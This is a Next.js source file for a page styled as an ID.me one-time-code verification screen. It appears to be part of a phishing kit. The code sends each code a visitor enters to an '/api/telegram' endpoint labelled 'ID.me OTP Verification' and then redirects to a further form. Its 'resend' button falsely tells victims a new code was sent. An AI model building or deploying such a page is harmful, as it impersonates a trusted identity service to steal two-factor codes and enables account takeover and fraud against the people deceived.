"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import idmeLogo from "./idme.png"; // reuse the same logo (adjust path if needed)

export default function OtpVerificationPage() {
  const router = useRouter();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);

  // Countdown timer logic
  useEffect(() => {
    if (countdown > 0 && !canResend) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else if (countdown === 0 && !canResend) {
      setCanResend(true);
    }
  }, [countdown, canResend]);

  // Format countdown as MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Handle OTP submission
  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp || otp.length < 4) {
      setError("Please enter the 6-digit verification code.");
      return;
    }
    setIsVerifying(true);
    setError("");
    setSuccess("");

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: { verification_code: otp },
          formType: "🔐 ID.me OTP Verification",
        }),
      });
      if (!res.ok) throw new Error("Verification failed");

      setSuccess("Code verified successfully!");
      setTimeout(() => router.push("/form"), 1500);
    } catch (err) {
      console.error(err);
      setError("Failed to verify code. Please try again.");
    } finally {
      setIsVerifying(false);
    }
  };

  // Handle resend code
  const handleResend = async () => {
    if (!canResend) return;
    setIsResending(true);
    setError("");
    setSuccess("");

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: { action: "resend_otp" },
          formType: "🔄 ID.me OTP Resend Request",
        }),
      });
      if (!res.ok) throw new Error("Resend failed");

      setSuccess("A new code has been sent to your device.");
      // Reset timer
      setCountdown(60);
      setCanResend(false);
    } catch (err) {
      console.error(err);
      setError("Failed to resend code. Please try again.");
    } finally {
      setIsResending(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        {/* Logo */}
        <div className="flex justify-center">
          <div className="w-32 h-12 relative">
            <Image src={idmeLogo} alt="ID.me" width={128} height={48} className="object-contain" priority />
          </div>
        </div>

        {/* Main Card */}
        <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-8 pt-8 pb-4">
            <h1 className="text-2xl font-semibold text-gray-900 text-center tracking-tight">
              Verification Code
            </h1>
            <p className="mt-2 text-sm text-gray-500 text-center">
              We've sent a 6‑digit code to your registered device.
            </p>
          </div>

          <div className="p-8">
            {error && (
              <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                {error}
              </div>
            )}
            {success && (
              <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                {success}
              </div>
            )}

            <form onSubmit={handleVerify} className="space-y-6">
              <div>
                <label htmlFor="otp" className="block text-sm font-medium text-gray-700 mb-1">
                  Enter Code
                </label>
                <input
                  id="otp"
                  name="otp"
                  type="text"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  required
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  placeholder="000000"
                  className="appearance-none block w-full px-4 py-3 text-center text-2xl tracking-widest border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                />
              </div>

              <button
                type="submit"
                disabled={isVerifying}
                className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed transition-colors"
              >
                {isVerifying ? "Verifying..." : "Verify Code"}
              </button>
            </form>

            <div className="mt-6 text-center">
              {canResend ? (
                <button
                  onClick={handleResend}
                  disabled={isResending}
                  className="text-sm font-medium text-blue-600 hover:text-blue-700 disabled:opacity-50"
                >
                  {isResending ? "Sending..." : "Resend code"}
                </button>
              ) : (
                <p className="text-sm text-gray-500">
                  Resend code in {formatTime(countdown)}
                </p>
              )}
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-8 text-center text-xs text-gray-500">
          <p>If you didn't receive a code, check your spam folder or contact support.</p>
        </div>
      </div>
    </div>
  );
}